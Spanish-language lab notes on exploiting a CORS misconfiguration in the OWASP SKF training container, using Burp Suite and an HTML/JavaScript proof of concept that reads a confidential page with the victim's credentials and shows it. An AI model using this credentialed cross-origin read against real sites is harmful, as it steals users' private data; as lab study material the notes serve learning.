Que es?



ejecutaremos el comando:
	docker pull blabla1337/owasp-skf-lab:cors

Interceptamos la peticion de la pagina y la recargamos
la mandamos a repeater de burpsuite y le damos a send
HTTP/1.0 200 OK

Content-Type: text/html; charset=utf-8

Content-Length: 10293

Access-Control-Allow-Credentials: true

Access-Control-Allow-Origin: * (observamos esto)

Vary: Cookie

Server: Werkzeug/0.14.1 Python/3.6.9

Date: Wed, 16 Apr 2025 18:49:13 GMT

observamos que tiene un * en Access-Control-Allow-Origin y eso empieza a darnos indicios de CORS


Aqui agregamos en la peticion Origin: https://test.com
![[Pasted image 20250416130320.png]]
y en Access Control Allow nos volca la pagina que le indicamos

Crearemos un script que obtenga lo que esta viendo el admin con python

   1   │ <script>
   2   │   var req = new XMLHttpRequest();
   3   │   req.onload = reqListener;
   4   │   req.open('GET', 'http://localhost:5000/confidential', true);
   5   │   req.withCredentials = true;
   6   │   req.send();
   7   │   function reqListener() {
   8   │     document.getElementById("stoleInfo").innerHTML = req.responseText;
   9   │ 
  10   │   }
  11   │ </script>
  12   │ <center><h1>Has sido ha, esta es la informacion que he obtenido</h1></c
       │ enter>
  13   │ 
  14   │ <p id="stoleInfo"></p>


COMO SERIA SI ESTUVIERA SANITIZADO

Si dentro de la estructura del serividor esta configurado Allow-Origin
y origin esta seteado

Sino esta seteado y esta como * y Allow-Origin no esta en el codigo y configurado se puede explotar esa vulnerabilidad



